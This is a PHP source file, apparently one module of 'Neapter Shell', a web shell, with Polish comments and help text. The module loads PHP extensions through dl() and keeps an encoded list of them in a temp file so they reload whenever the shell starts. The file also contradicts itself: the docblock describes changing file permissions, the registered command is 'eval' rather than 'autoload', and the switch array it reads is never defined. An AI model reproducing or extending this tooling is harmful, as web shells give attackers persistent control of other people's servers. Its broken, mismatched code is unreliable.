<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleAutoload extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('eval');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        /**
         * Wersja Data Autor
         */
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Wczytywanie rozszerzeń PHP

    Rozszerzenia te wczytywane są za każdym razem podczas startu

    Użycie:
        autoload -l - wyświetlanie rozszerzen, które zostały wczytane
        autoload -f - odłączenie wszystkich rozszerzen
        autoload nazwa_rozszerzenia [sciezka_do_rozszerzenia rozszerzenie]

    Przykład:
        autoload imap
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {

        /**
         * Lista poprzednio wczytanych rozszerzen
         */
        $aAutoload = array();

        if (is_file($sFilePath = $this->sTmp . '/' . $this->sPrefix . '_autoload')
            && (($sData = file_get_contents($sFilePath)) !== FALSE)
        ) {
            $aAutoload = unserialize($this->decode($sData));
        }

        /**
         * List
         */
        if (array_key_exists('l', $aSwitches)) {
            if ($aAutoload === array()) {
                return 'Nie wczytano żadnych rozszerzeń';
            }

            /**
             * Wczytywanie rozszerzen
             */
            $sOutput = NULL;

            foreach ($aAutoload as $sExtension) {
                $sOutput .= $sExtension . "\r\n";
            }

            return "Wczytane rozszerzenia:\r\n\r\n" . $sOutput;
        }

        /**
         * Flush
         */
        if (array_key_exists('f', $aSwitches)) {
            return sprintf('Plik z rozszerzeniami %szostał usunięty', !unlink($this->sTmp . '/' . $this->sPrefix . '_autoload') ? 'nie ' : NULL);
        }

        /**
         * Wczytywanie rozszerzen
         */
        $sOutput = NULL;

        foreach ($this->oArgs->getParams() as $sExtension) {
            /**
             * Czy rozszerzenie zostalo juz poprzednio wczytane
             */
            if (in_array($sExtension, $aAutoload)) {
                $sOutput .= sprintf("Poprzednio wczytany - %s\r\n", $sExtension);
                continue;
            }

            /**
             * Wczytywanie rozszerzenia
             */
            if (($bLoaded = $this->dl($sExtension))) {
                $aAutoload[] = $sExtension;
            }

            $sOutput .= sprintf("%s - %s\r\n", ($bLoaded ? '    Wczytano' : 'Nie wczytano'), $sExtension);
        }

        /**
         * Zapis rozszerzen do pliku
         */
        file_put_contents($this->sTmp . '/' . $this->sPrefix . '_autoload', $this->encode(serialize($aAutoload)));

        return $sOutput;
    }

}
